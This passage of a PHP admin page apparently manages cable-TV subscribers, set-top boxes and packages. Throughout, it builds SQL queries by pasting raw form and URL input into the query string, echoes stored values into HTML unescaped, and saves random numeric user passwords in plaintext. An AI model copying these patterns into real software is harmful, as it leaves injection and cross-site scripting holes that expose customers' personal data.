<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("updateStatus");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("subInfo");
        $this->xajax->registerFunction("viewSubscriber");
        $this->xajax->registerFunction("delSubscriber");
        $this->xajax->registerFunction("subLedger");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    //print_r($_POST);exit;
    $cond       = "(CUSTOMER_ID='$_POST[customer_id]' OR MSO_ID='$_POST[mso_id]') AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'";
    $recdata    = $objMisc->GiveValue($cond,"SUBSCRIBER_ID","subscribers"); 
    
    if($recdata==$id && $id!='' || $recdata=='' && $id!=''){
        if($_POST['payment_method']=='L'){
            $actual_amount = $_POST['actual_amount'];
            $amount        = $_POST['amount'];

        }else{
            $actual_amount = $_POST['pactual_amount'];
            $amount        = $_POST['final_amount'];
        }
        $rowArray = array(  'NAME'              => $_POST['name'],
                            'FRANCHISE_ID'      => $_POST['franchise_id'],
                            'CUSTOMER_ID'       => $_POST['customer_id'],
                            'MSO_ID'            => $_POST['mso_id'],
                            'SERIAL_NO'         => $_POST['serial_no'],
                            'OPENING_BALANCE'   => $_POST['opening_balance'],
                            'UNIT_ID'           => $_POST['unit_id'],
                            'ADDRESS'           => $_POST['address'],
                            'PHONE_NO'          => $_POST['phone_no'],
                            'MOBILE_NO'         => $_POST['mobile_no'],
                            'EMAIL'             => $_POST['email'],
                            'ACTUAL_AMOUNT'     => $actual_amount,
                            'DISCOUNT'          => $_POST['discount'],
                            'CONNECTION_DATE'   => $objMisc->changeDateFormat($_POST['connection_date']),
                            'AMOUNT'            => $amount,
                            'REMARKS'           => addslashes($_POST['remarks']),
                            'ADDED_BY'          => $_SESSION['USER_ID'],
                            'ADDED_TIME'        => date('Y-m-d H:i:s'));
        $cond       = "";
        $cond       = " NAME = '$_POST[name]'";
        $recdata    = $objMisc->GiveValue($cond,"UNIT_ID","subscribers"); 
        $val        = $objMisc->update("subscribers",$rowArray,"SUBSCRIBER_ID='$id'");
        if(!empty($id)){
            $userId=$objMisc->GiveValue("USER_TYPE='S' AND ID='$id'",'USER_ID','users');
            if(empty($userId) && !empty($_POST['phone_no'])){
                $userArray=array('USERNAME'         => ((empty($_POST['phone_no']))?$_POST['customer_id']:$_POST['phone_no']),
                             'PASSWORD'         => rand(111111,999999),
                             'USER_TYPE'        =>'S',
                             'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                             'ID'               =>$id);
                $userInsert        = $objMisc->insert("users",$userArray);
            }
            foreach ($_POST['package_id'] as $k => $rowRe) {
                if(!empty($_POST['package_id'][$k])){
                    $subscription_id=$_POST['subscription_id'][$k];
                    $stb_id=$_POST['stb_id'][$k];
                    if($subscription_id=='' && $stb_id==''){
                        $subscriptionArray = array( 'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                    'STB_NO'           =>'DUM-'.$id.'-'.$_SESSION['HEADOFFICE'].'-'.rand(1111,9999),
                                                    'STATUS'           =>'B',
                                                    'ADDED_BY'         =>'1',
                                                    'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                    );
                        $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                        $subscription_id=mysqli_insert_id($_SESSION['CONN']);
                        $stbArray   = array('HEADOFFICE_ID'          => $_SESSION['HEADOFFICE'],
                                            'SUBSCRIBER_ID'          => $id,
                                            'SUBSCRIPTION_ID'        => $subscription_id,
                                            'PACKAGE_ID'             => $_POST['package_id'][$k],
                                            'LA_CARTE_ID'            => $_POST['la_carte_id'][$k],
                                            'RELATION'               => $_POST['relation'][$k],
                                            'RELATIVE'               => $_POST['relative'][$k],
                                            'TYPE_ID'                => $_POST['type_id'][$k],
                                            'ID_NO'                  => $_POST['id_no'][$k],
                                            'INSTALLED_BY'           => $_POST['installed_by'][$k],
                                            'IDENTITY_NAME'          => $_POST['identity_name'][$k],
                                            'LA_CARTE_NAME'          => $_POST['la_carte_name'][$k],
                                            'LA_CARTE_AMOUNT'        => $_POST['la_carte_amount'][$k],
                                            'ADDED_BY'               => $_SESSION['USER_ID'],
                                            'ADDED_TIME'             => date('Y-m-d H:i:s'));
                        //print_r($stbArray);exit;
                        $valstb     = $objMisc->insert("stb_box",$stbArray);
                        $subscription_id=mysqli_insert_id($_SESSION['CONN']);
                        $packageId=$_POST['package_id'][$k];
                        $PackageAmt=$objMisc->GiveValue("PACKAGE_ID='$packageId'",'PARENT_CHARGES','package_master');  
                        $amount         = $PackageAmt+$_POST['la_carte_amount'][$k];
                        /*$rowArray       = array('HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                                                'SUBSCRIBER_ID'     =>$id,
                                                'UNIT_ID'           =>$_POST['unit_id'],
                                                'STB_ID'            =>$subscription_id,
                                                'AMOUNT_TYPE'       =>'D',
                                                'MONTH_DATE'        =>date('Y-m-d'),
                                                'AMOUNT'            =>$amount,
                                                'ADDED_BY'          =>$_SESSION['EMPLOYEE_ID'],
                                                'ADDED_TIME'        =>date('Y-m-d H:i:s'));
                        $val            = $objMisc->insert('monthly_charges',$rowArray);*/
                    }else if($subscription_id!='' && $stb_id==''){
                        $stbArray   = array('HEADOFFICE_ID'         => $_SESSION['HEADOFFICE'],
                                            'SUBSCRIBER_ID'          => $id,
                                            'SUBSCRIPTION_ID'        => $subscription_id,
                                            'PACKAGE_ID'             => $_POST['package_id'][$k],
                                            'LA_CARTE_ID'             => $_POST['la_carte_id'][$k],
                                            'RELATION'               => $_POST['relation'][$k],
                                            'RELATIVE'               => $_POST['relative'][$k],
                                            'TYPE_ID'                => $_POST['type_id'][$k],
                                            'ID_NO'                  => $_POST['id_no'][$k],
                                            'INSTALLED_BY'           => $_POST['installed_by'][$k],
                                            'IDENTITY_NAME'          => $_POST['identity_name'][$k],
                                            'LA_CARTE_NAME'          => $_POST['la_carte_name'][$k],
                                            'LA_CARTE_AMOUNT'        => $_POST['la_carte_amount'][$k],
                                            'ADDED_BY'               => $_SESSION['USER_ID'],
                                            'ADDED_TIME'             => date('Y-m-d H:i:s'));
                        //print_r($stbArray);exit;
                        $valstb     = $objMisc->insert("stb_box",$stbArray);
                        $subscription_id=mysqli_insert_id($_SESSION['CONN']);
                        $packageId=$_POST['package_id'][$k];
                        $PackageAmt=$objMisc->GiveValue("PACKAGE_ID='$packageId'",'PARENT_CHARGES','package_master');  
                        $amount         = $PackageAmt+$_POST['la_carte_amount'][$k];
                        /*$rowArray       = array('HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                                                'SUBSCRIBER_ID'     =>$id,
                                                'UNIT_ID'           =>$_POST['unit_id'],
                                                'STB_ID'            =>$subscription_id,
                                                'AMOUNT_TYPE'       =>'D',
                                                'MONTH_DATE'        =>date('Y-m-d'),
                                                'AMOUNT'            =>$amount,
                                                'ADDED_BY'          =>$_SESSION['EMPLOYEE_ID'],
                                                'ADDED_TIME'        =>date('Y-m-d H:i:s'));
                        $val            = $objMisc->insert('monthly_charges',$rowArray);*/
                    }else{
                        $stbArray   = array('HEADOFFICE_ID'         => $_SESSION['HEADOFFICE'],
                                            'SUBSCRIBER_ID'          => $id,
                                            'SUBSCRIPTION_ID'        => $subscription_id,
                                            'PACKAGE_ID'             => $_POST['package_id'][$k],
                                            'LA_CARTE_ID'             => $_POST['la_carte_id'][$k],
                                            'RELATION'               => $_POST['relation'][$k],
                                            'RELATIVE'               => $_POST['relative'][$k],
                                            'TYPE_ID'                => $_POST['type_id'][$k],
                                            'ID_NO'                  => $_POST['id_no'][$k],
                                            'INSTALLED_BY'           => $_POST['installed_by'][$k],
                                            'IDENTITY_NAME'          => $_POST['identity_name'][$k],
                                            'LA_CARTE_NAME'          => $_POST['la_carte_name'][$k],
                                            'LA_CARTE_AMOUNT'        => $_POST['la_carte_amount'][$k],
                                            'ADDED_BY'               => $_SESSION['USER_ID'],
                                            'ADDED_TIME'             => date('Y-m-d H:i:s'));
                        //print_r($stbArray);exit;
                        $valstb     = $objMisc->update("stb_box",$stbArray,"SUBSCRIBER_ID='$id' AND SUBSCRIPTION_ID='$subscription_id' AND STB_ID='$stb_id'");
                        if($_POST['current_utility']=='Y'){
                            $packageId=$_POST['package_id'][$k];
                            $parentCharg=$objMisc->GiveValue("PACKAGE_ID='$packageId' AND PACKAGE_TYPE='P'",'PARENT_CHARGES','package_master');
                            //$lapackageId=$_POST['la_carte_id'][$k];
                            //$laparentCharg=$objMisc->GiveValue("PACKAGE_ID='$lapackageId' AND PACKAGE_TYPE='L'",'PARENT_CHARGES','package_master');
                            $totPack=$parentCharg+$_POST['la_carte_amount'][$k];
                            $currentMon=date('m');
                            $currentYear=date('Y');
                            $where=" MONTH(MONTH_DATE)='$currentMon' AND YEAR(MONTH_DATE)='$currentYear' AND SUBSCRIBER_ID='$id' AND STB_ID='$stb_id' AND AMOUNT_TYPE='D'";
                            $packArr=array('AMOUNT' =>$totPack);
                            //print_r($packArr);exit;
                            $objMisc->update('monthly_charges',$packArr,$where);
                        }
                    }
                    
                    $updateBoxStatus=array('AVAILABILITY'       =>'B');
                    $updateBox=$objMisc->update('subscriptions',$updateBoxStatus,"SUBSCRIPTION_ID='$subscription_id'");
                }
            }
        }
        $_SESSION['msg'] = 2;
        header("location:subscribers-otherway.php");
        exit;
    }else{
        if($recdata!=''){
            $_SESSION['msg'] = 4;
            $rowArray = "";
            $rowArray = $_POST;
        }else{
            if($_POST['payment_method']=='L'){
                $actual_amount = $_POST['actual_amount'];
                $amount        = $_POST['amount'];

            }else{
                $actual_amount = $_POST['pactual_amount'];
                $amount        = $_POST['final_amount'];
            }
            $rowArray = array(  'HEADOFFICE_ID'     => $_SESSION['HEADOFFICE'],
                                'FRANCHISE_ID'      => $_POST['franchise_id'],
                                'NAME'              => $_POST['name'],
                                'CUSTOMER_ID'       => $_POST['customer_id'],
                                'MSO_ID'            => $_POST['mso_id'],
                                'SERIAL_NO'         => $_POST['serial_no'],
                                'OPENING_BALANCE'   => $_POST['opening_balance'],
                                'ADDRESS'           => $_POST['address'],
                                'PHONE_NO'          => $_POST['phone_no'],
                                'MOBILE_NO'         => $_POST['mobile_no'],
                                'EMAIL'             => $_POST['email'],
                                'EMPLOYEE_ID'       => $_POST['employee_id'],
                                'CONNECTION_DATE'   => date('Y-m-d'),
                                'UNIT_ID'           => $_POST['unit_id'],
                                'PAYMENT_METHOD'    => $_POST['payment_method'],
                                'PAYMENT_TYPE'      => $_POST['payment_type'],
                                'ACTUAL_AMOUNT'     => $actual_amount,
                                'DISCOUNT'          => $_POST['discount'],
                                'AMOUNT'            => $amount,
                                'REMARKS'           => addslashes($_POST['remarks']),
                                'ADDED_BY'          => $_SESSION['USER_ID'],
                                'ADDED_TIME'        => date('Y-m-d H:i:s'));
            $cond       = "";
            $cond       = " NAME = '$_POST[name]' OR CUSTOMER_ID='$_POST[customer_id]' OR MSO_ID='$_POST[mso_id]'";
            $recdata    = $objMisc->GiveValue($cond,"UNIT_ID","subscribers"); 
            $val        = $objMisc->insert("subscribers",$rowArray);
            $lastId=mysqli_insert_id($_SESSION['CONN']);
            if(!empty($lastId) && !empty($_POST['phone_no'])){
                $userArray=array('USERNAME'         => ((empty($_POST['phone_no']))?$_POST['customer_id']:$_POST['phone_no']),
                                 'PASSWORD'         => rand(111111,999999),
                                 'USER_TYPE'        =>'S',
                                 'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                 'ID'               =>$lastId);
                $userInsert        = $objMisc->insert("users",$userArray);
                if(!empty($_POST['opening_balance']) && $_POST['opening_balance']!=0){
                    $openingBalanceArray=array(
                        'HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                        'SUBSCRIBER_ID'     =>$lastId,
                        'RECEIPT_NO'        =>'Opening Balance',
                        'AMOUNT_TYPE'       =>(($_POST['opening_balance']>0)?'D':'C'),
                        'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                        'MONTH_DATE'       =>date('Y-m-d'),
                        'AMOUNT'            =>abs($_POST['opening_balance']));
                    $insOpeningBal=$objMisc->insert('monthly_charges',$openingBalanceArray);
                }
            }
            if(!empty($lastId)){
                foreach ($_POST['subscription_id'] as $k => $rowRe) {
                        if(!empty($_POST['package_id'][$k])){
                            $subscription_id=$_POST['subscription_id'][$k];
                            if($subscription_id==''){
                                $subscriptionArray = array( 'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                            'STB_NO'           =>'DUM-'.$lastId.'-'.$_SESSION['HEADOFFICE'].'-'.rand(1111,9999),
                                                            'AVAILABILITY'     =>'B',
                                                            'ADDED_BY'         =>'1',
                                                            'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                                $subscription_id=mysqli_insert_id($_SESSION['CONN']);
                            }
                            $stbArray   = array(    'HEADOFFICE_ID'         => $_SESSION['HEADOFFICE'],
                                                    'SUBSCRIBER_ID'          => $lastId,
                                                    'SUBSCRIPTION_ID'        => $subscription_id,
                                                    'PACKAGE_ID'             => $_POST['package_id'][$k],
                                                    'LA_CARTE_ID'            => $_POST['la_carte_id'][$k],
                                                    'RELATION'               => $_POST['relation'][$k],
                                                    'RELATIVE'               => $_POST['relative'][$k],
                                                    'TYPE_ID'                => $_POST['type_id'][$k],
                                                    'ID_NO'                  => $_POST['id_no'][$k],
                                                    'INSTALLED_BY'           => $_POST['installed_by'][$k],
                                                    'IDENTITY_NAME'          => $_POST['identity_name'][$k],
                                                    'LA_CARTE_NAME'          => $_POST['la_carte_name'][$k],
                                                    'LA_CARTE_AMOUNT'        => $_POST['la_carte_amount'][$k],
                                                    'ADDED_BY'               => $_SESSION['USER_ID'],
                                                    'ADDED_TIME'             => date('Y-m-d H:i:s'));
                            //print_r($stbArray);exit;
                            $valstb     = $objMisc->insert("stb_box",$stbArray);
                            $updateBoxStatus=array('AVAILABILITY'       =>'B');
                            $updateBox=$objMisc->update('subscriptions',$updateBoxStatus,"SUBSCRIPTION_ID='$subscription_id'");
                        }

                }
            }               
            $_SESSION['msg'] = 1;
            header("location:subscribers-otherway.php");
            exit;
        }
    }
}
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['search']) || $_GET['method']=='search'){
    $name=$_REQUEST['name'];
    $phone_no=$_REQUEST['phone_no'];
    $unit_id=$_REQUEST['unit_id'];
    $mso_id=$_REQUEST['mso_id'];
    $serial_no=$_REQUEST['serial_no'];
    $stb_no=$_REQUEST['stb_no'];
    $customer_id=$_REQUEST['customer_id'];
    $and='';
    if(!empty($name)){
        $and .=" AND S.NAME LIKE '%$name%'";
        $paging_params.="&name=$name";
    }
    if(!empty($phone_no)){
        $and .=" AND S.PHONE_NO='$phone_no'";
        $paging_params.="&phone_no=$phone_no";
    }
    if(!empty($unit_id)){
        $and .=" AND S.UNIT_ID='$unit_id'";
        $paging_params.="&unit_id=$unit_id";
    }
    if(!empty($customer_id)){
        $and .=" AND S.CUSTOMER_ID LIKE '$customer_id%'";
        $paging_params.="&customer_id=$customer_id";
    }
    if(!empty($mso_id)){
        $and .=" AND S.MSO_ID LIKE '$mso_id%'";
        $paging_params.="&mso_id=$mso_id";
    }
    if(!empty($serial_no)){
        $and .=" AND S.SERIAL_NO LIKE '$serial_no%'";
        $paging_params.="&serial_no=$serial_no";
    }
    if(!empty($stb_no)){
        $and .=" AND SP.STB_NO LIKE '$stb_no%'";
        $paging_params.="&stb_mo=$stb_no";
    }
    $paging_params.="&method=search";
    $searchArray=$_REQUEST;
    if(!empty($paging_params))

    {

        $objMisc->paging_params=$paging_params;

    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
    case 1:
        $msg = "Subscriber added successfully.";
    break;
    case 2:
        $msg = "Record updated successfully.";
    break;
    case 3:
        $msg = "Record has been deleted successfully.";
    break;    
    case 4:
        $errormsg = "Subscriber with same Customer Id or Mso Id/Customer Code is already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Subscriber name already exists.";
        $msg = "";
    break;
}

if($id){
    $where = 'SUBSCRIBER_ID = '.$id;
    $rowArray = $objMisc->getRow("subscribers",$where);
}
$wherethis = " 1=1 AND S.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND U.STATUS='A' AND W.STATUS='A' AND S.STATUS!='T' $and GROUP BY SUBSCRIBER_ID ORDER BY CAST(S.`SERIAL_NO` AS SIGNED) ASC";
//echo "SELECT S.NAME as subscriber,S.STATUS as SUB_STATUS,W.NAME as area,U.NAME as sub_area,S.* FROM subscribers S LEFT JOIN unit_master U ON U.UNIT_ID=S.UNIT_ID LEFT JOIN wing_master W ON W.`WING_ID`=U.`WING_ID` LEFT JOIN headoffice_master H ON H.HEADOFFICE_ID=W.HEADOFFICE_ID LEFT JOIN `stb_box` B ON B.SUBSCRIBER_ID=S.SUBSCRIBER_ID LEFT JOIN `subscriptions` SP ON SP.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE $wherethis";
$classRecord = $objMisc->getAllRecordsPagingNew("SELECT S.NAME as subscriber,S.STATUS as SUB_STATUS,W.NAME as area,U.NAME as sub_area,S.* FROM subscribers S LEFT JOIN unit_master U ON U.UNIT_ID=S.UNIT_ID LEFT JOIN wing_master W ON W.`WING_ID`=U.`WING_ID` LEFT JOIN headoffice_master H ON H.HEADOFFICE_ID=W.HEADOFFICE_ID LEFT JOIN `stb_box` B ON B.SUBSCRIBER_ID=S.SUBSCRIBER_ID LEFT JOIN `subscriptions` SP ON SP.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE $wherethis");
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="20%">Name/Phone No</th><th>Customer Id</th><th>Customer Code/MSO</th><th>Serial No</th><th width="15%">Area/Sub Area</th><th width="12%">Stb Boxes</th><th>Action';

if(is_array($classRecord[1])){ 
    //$pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';
    //$pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
    
}
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['subscriber'].'<br>'.$rowRec['phone_no'].'<br>';
                $pagin_recs .= '<b id="status'.$rowRec['subscriber_id'].'">';
                if($rowRec['sub_status']=='A'){
                   $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['subscriber_id'].'" id="imgStatus'.$rowRec['subscriber_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="changeSubStatA('.$rowRec['subscriber_id'].');">&nbsp;';
                }else{
                   $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['subscriber_id'].'" id="imgStatus'.$rowRec['subscriber_id'].'" alt="Activate" title="Activate" border="0" onclick="changeSubStatD('.$rowRec['subscriber_id'].');">&nbsp;';
                }
            $pagin_recs .='<b></td>';
            $pagin_recs .='<td>'.$rowRec['customer_id'].'</td>';
            $pagin_recs .='<td>'.$rowRec['mso_id'].'</td>';
            $pagin_recs .='<td>'.$rowRec['serial_no'].'</td>';
            $pagin_recs .='<td>'.((!empty($rowRec['address']))?$rowRec['address'].'<br>':'').$rowRec['area'].'<br>'.$rowRec['sub_area'].'</td>';
            $pagin_recs .='<td>';
            $pagin_recs .='<table class="table table-bordered">';
                //echo "SELECT S.STB_NO,S.SUBSCRIPTION_ID,B.STATUS,B.`STB_ID`, FROM `stb_box` B JOIN `subscriptions` S ON S.`SUBSCRIPTION_ID`=B.`SUBSCRIPTION_ID` WHERE B.SUBSCRIBER_ID='$rowRec[subscriber_id]'";
                $sql=$objMisc->getAllRecordsNew("SELECT S.STB_NO,S.SUBSCRIPTION_ID,B.STATUS,B.`STB_ID` FROM `stb_box` B JOIN `subscriptions` S ON S.`SUBSCRIPTION_ID`=B.`SUBSCRIPTION_ID` WHERE B.SUBSCRIBER_ID='$rowRec[subscriber_id]' AND (B.`REMARKS`NOT LIKE 'Permanent Disconnection%' AND B.`REMARKS` NOT LIKE 'Box is Faulty.%')");
                foreach($sql as $f =>$res){
                    $pagin_recs .='<tr>';
                        $pagin_recs .='<td style="width:75%">'.$res['stb_no'].'</td>';
                        $pagin_recs .='<td id="status'.$res['stb_id'].'"><input type="hidden" name="enumStatus'.$res['stb_id'].'" id="enumStatus'.$res['stb_id'].'"  value="'.$res['status'].'">';
                        if($rowRec['sub_status']=='A'){
                            if($res['status']=='A'){
                               $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$res['stb_id'].'" id="imgStatus'.$res['stb_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return updateStatus('.$res['stb_id'].');" data-toggle="modal" data-target="#myModal">&nbsp;';
                            }else{
                                $checkBoxCondition=$objMisc->GiveValue("SUBSCRIPTION_ID='$res[subscription_id]' AND SUBSCRIBER_ID='$rowRec[subscriber_id]' ORDER BY HISTORY_ID DESC LIMIT 1",'REMARKS','subscriber_history');
                                if($checkBoxCondition==='Box is Faulty.') {
                                    $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$res['stb_id'].'" id="imgStatus'.$res['stb_id'].'" alt="Activate" title="Box is Faulty.">';
                                }else{ 
                                    $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$res['stb_id'].'" id="imgStatus'.$res['stb_id'].'" alt="Activate" title="Activate" border="0" onclick="return updateStatus('.$res['stb_id'].');" data-toggle="modal" data-target="#myModal">';
                                }
                            }
                        }
                        $pagin_recs .='</td>';
                    $pagin_recs .='</tr>';
                    $f++;
                }
            $pagin_recs .='</table>';
            $pagin_recs .='</td>';
            $pagin_recs .='<td> &nbsp;';
           // echo $_SESSION['USER_ID'];
                    
                
                $pagin_recs .='<a href="subscribers-otherway.php?id='.base64_encode($rowRec['subscriber_id']).'&page='.$_GET['page'].'" ><img src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                //$pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['subscriber_id'].'" id="artCatCheckbox_'.$i.'" style="margin: 0 5px;">&nbsp;';
                $pagin_recs .='<a href="comment-log.php?id='.$rowRec['subscriber_id'].'&name='.$rowRec['subscriber'].'" target="_blank"><img src="images/chat-log.png"></a>&nbsp;';
                $pagin_recs .='<a href="subscriber-ledger.php?id='.$rowRec['subscriber_id'].'&name='.$rowRec['subscriber'].'&phone_no='.$rowRec['phone_no'].'&customer_id='.$rowRec['customer_id'].'&mso_id='.$rowRec['mso_id'].'" target="_blank"  class="btn btn-primary btn-sm" style="margin: 0px 0px 0px 12px;">View</a>&nbsp;';
                $pagin_recs .='<button class="btn btn-info btn-sm" onclick="xajax_subLedger('.$rowRec['subscriber_id'].');" data-toggle="modal" data-target="#myModal">Ledger</button>&nbsp;';
                $pagin_recs .='<button class="btn btn-info btn-sm" onclick="xajax_subInfo('.$rowRec['subscriber_id'].');" data-toggle="modal" data-target="#myModal">Info</button>&nbsp;';
                $pagin_recs .= '<a href="javascript:;" onclick="deleteThisRow('.$rowRec['subscriber_id'].');"><img src="images/delete.jpeg"></a>';
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="6" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Subscriber Information";
}else{
   $pageheading = "Add New Subscriber"; 
}
$wings             =   $objMisc->getAllRecordsNew("SELECT * FROM `wing_master` WHERE 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' ORDER BY WING_ID DESC"); 
foreach ($wings as $key => $resRow) {
    $unitArray .='<optgroup label="'.$resRow['name'].'">';
    $units =   $objMisc->getAllRecordsNew("SELECT * FROM `unit_master` WHERE 1=1 AND WING_ID='$resRow[wing_id]'AND STATUS='A'  ORDER BY UNIT_ID DESC"); 
    foreach ($units as $key => $resRew) {
        
       $unitArray .='<option '.(($rowArray['unit_id']==$resRew['unit_id'])?'selected="selected"':'').' value="'.$resRew['unit_id'].'">'.$resRew['name'].'</option>'; 
    }
    $unitArray .='</optgroup>';
}
$whereEmp          =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and STATUS = 'A' and UNIT_ID='$rowArray[unit_id]' order by EMPLOYEE_ID";
$empArray          =   $objMisc->myFunc->fnWriteOptionList($rowArray['employee_id'],'NAME,EMPLOYEE_ID','employees',$whereEmp,0,0,0); 
$wherePackage      =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND PACKAGE_TYPE='P' and STATUS = 'A' order by PACKAGE_ID DESC";
$packageArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['package_id'],'NAME,PACKAGE_ID','package_master',$wherePackage,0,0,0); 
$wherelaCarte      =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND PACKAGE_TYPE='L' and STATUS = 'A' order by PACKAGE_ID DESC";
$laCarteArray      =   $objMisc->myFunc->fnWriteOptionListIds($rowArray['la_carte_id'].'_'.$rowArray['parent_charges'],'NAME,PACKAGE_ID,PARENT_CHARGES','package_master',$wherelaCarte,0,0,0);  
$whereStbBox       =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and STATUS = 'A' AND AVAILABILITY='AV' order by SUBSCRIPTION_ID DESC";
$stbArray          =   $objMisc->myFunc->fnWriteOptionList($rowArray['subscription_id'],'STB_NO,SUBSCRIPTION_ID','subscriptions',$whereStbBox,0,0,0);  
$franchiseArray    =   $objMisc->myFunc->fnWriteOptionList($rowArray['franchise_id'],'NAME,FRANCHISE_ID','franchise_master'," 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",0,0,0);  


$customer_id = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'CUSTOMER_ID','subscribers');
$mso_id      = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'MSO_ID','subscribers');
if(empty($customer_id)){
    $customerId='000001';
}elseif(!empty($rowArray)){
    $customerId=$rowArray['customer_id'];
}else{
    $customerId=sprintf("%06d", $customer_id+1);
}
if(!empty($rowArray['mso_id'])){
    $msoId=$rowArray['mso_id'];
}elseif(empty($mso_id)){
    $msoId='000001';
}else{
    $msoId=sprintf("%06d", $mso_id+1);
}
if($id){
    $subscriberBoxRecs=$objMisc->getAllRecordsNew("SELECT B.*,S.`STB_NO` FROM `stb_box` B JOIN `subscriptions` S ON S.`SUBSCRIPTION_ID`=B.`SUBSCRIPTION_ID` WHERE B.SUBSCRIBER_ID='$id'");
    $i=1;
    $count=count($subscriberBoxRecs);
    if($count==0){
        $packageArr =   $objMisc->myFunc->fnWriteOptionList('','NAME,PACKAGE_ID','package_master',$wherePackage,0,0,0);  
        $subscriberBoxes .='<div class="col-lg-12">
                                    <div class="col-sm-3">
                                        <label>Stb NO</label>
                                        <input required type="text" value="" onkeyup="KeyedUp1(1);" name="subscription[]" id="subscription_id1'.$i.'" autocomplete="off" class="form-control"/>
                                        <input required type="hidden" value="" name="subscription_id[]" id="subscription1'.$i.'" autocomplete="off" class="form-control"/>
                                        <div id="display1'.$i.'" class="display"></div>
                                    </div>
                                    <div class="col-sm-2">
                                        <label>Package</label>
                                        <select id="package_id'.$i.'"  name="package_id[]" onchange="TotAmt('.$i.')" class="form-control">
                                            <option value="">-Please Select-</option>
                                            '.$packageArr.'
                                        </select>
                                    </div>
                                    <div class="col-sm-2">
                                        <label style="float:left;width:100%;">A La Carte</label>
                                        <input type="text" name="la_carte_name[]" id="la_carte_name'.$i.'" class="form-control" style="float:left;width:48%" placeholder="Name">&nbsp;
                                        <input type="text" name="la_carte_amount[]" id="la_carte_amount'.$i.'" class="form-control" onkeyup="TotAmt('.$i.');" style="float:left;width:48%" placeholder="Price">
                                    </div>
                                    <div class="col-sm-2">
                                        <label>Box Charges</label>';
                                            $subscriberBoxes .='<input type="text" name="box_charges[]" id="box_charges'.$i.'" class="form-control" value="">
                                    </div>
                                    <div class="col-sm-2">
                                        <label>Amount</label>';
